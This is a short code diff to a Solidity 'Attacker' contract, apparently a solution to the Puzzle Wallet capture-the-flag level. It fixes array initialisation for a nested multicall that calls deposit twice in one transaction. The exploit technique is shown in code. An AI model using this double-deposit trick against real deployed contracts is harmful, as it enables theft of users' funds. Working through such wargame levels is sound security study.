@@ -8,7 +8,7 @@ contract Attacker {
     PuzzleProxy px;
     PuzzleWallet pxWallet;
 
-    constructor(address _px, address _impl) payable {
+    constructor(address _px) payable {
         px = PuzzleProxy(payable(_px));
         pxWallet = PuzzleWallet(_px);
     }
@@ -25,12 +25,12 @@ contract Attacker {
         //nesting a multicall in another multicall
 
         bytes memory deposit = abi.encodeWithSelector(PuzzleWallet.deposit.selector); 
-        bytes[] memory data;
+        bytes[] memory data = new bytes[](2);
         //data[0] - call the deposit function
         data[0] = deposit;
         
         //multicalldata - the calldata for a nested multicall function
-        bytes[] memory multicalldata;
+        bytes[] memory multicalldata = new bytes[](1);
         multicalldata[0] = deposit;
 
         //data[1] - call multicall which is going to call deposit again
